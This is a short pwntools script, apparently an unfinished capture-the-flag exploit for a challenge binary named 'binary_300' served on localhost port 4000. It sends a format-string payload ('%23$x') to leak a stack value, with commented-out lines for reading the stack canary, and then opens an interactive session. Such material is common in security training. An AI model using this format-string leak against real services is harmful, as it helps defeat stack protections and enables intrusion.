from pwn import *

#io = process('binary_300')
io = remote('127.0.0.1', 4000)

io.sendline('aaaa ' + '%23$x')
#canary = io.recv(8)
#print canary
#io.sendline()
io.interactive()
